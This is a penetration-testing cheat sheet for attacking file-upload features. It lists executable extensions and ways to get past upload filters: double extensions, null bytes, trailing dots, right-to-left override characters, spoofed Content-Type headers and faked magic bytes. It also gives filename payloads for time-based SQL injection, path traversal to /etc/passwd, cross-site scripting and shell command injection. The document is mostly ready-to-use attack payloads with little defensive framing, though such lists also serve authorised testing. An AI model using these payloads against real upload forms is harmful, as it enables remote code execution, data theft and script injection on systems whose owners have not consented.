# Insecure File Upload

## Defaults extensions

```bash
#PHP
.php, .php3, .php4, .php5, .php7, .pht, .phps, .phar, .phpt, .pgif, .phtml, .phtm, .inc

#ASP
.asp, .aspx, .cer, .asa

#JSP
.jsp, .jspx, .jsw, .jspf

#Perl
.pl, .pm, .cgi, .lib

#Coldfusion
.cfm, .cfml, .cfc, .dbm
```

## Bypasses

### Double extensions

```bash
file.jpg.php
file.php.jpg
file.php.blah123jpg
```

### Null byte

```text
file.php%00.gif
file.php\x00.gif
file.php%00.png
file.php\x00.png
file.php%00.jpg
file.php\x00.jpg
```

### Special characters

```bash
#In Windows when a file is created with dots at the end those will be removed
file.php......

#Whitespace characters
file.php%20

#Right ot Left Override
file.%E2%80%AEphp.jpg #Will became file.gpj.php
```

### Content-type Bypass

```bash
#Original name but different content-type
Content-Type: image/jpeg
Content-Type: image/gif
Content-Type: image/png
```

### Magic bytes

```bash
#Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application
PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
JPG: \xff\xd8\xff
GIF: GIF87a
GIF: GIF8
```

### Filename Vulnerabilities:

```bash
#Time-Based SQLi Payloads
poc.js'(select*from(select(sleep(20)))a)+'.extension

#LFI Payloads
image.png../../../../../../../etc/passwd

#XSS Payloads
'"><img src=x onerror=alert(document.domain)>.extension

#File Traversal
../../../tmp/lol.png

#Command Injection
; sleep 10;
```

## All Filename payloads

```csharp
.jpg.php
.php.jpg
.php.blah123jpg
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
.php......
.php%20
.%E2%80%AEphp.jpg
.js'(select*from(select(sleep(20)))a)+'.extension
.png../../../../../../../etc/passwd
'"><img src=x onerror=alert(document.domain)>.extension
../../../tmp/lol.png
.; sleep 10;
```

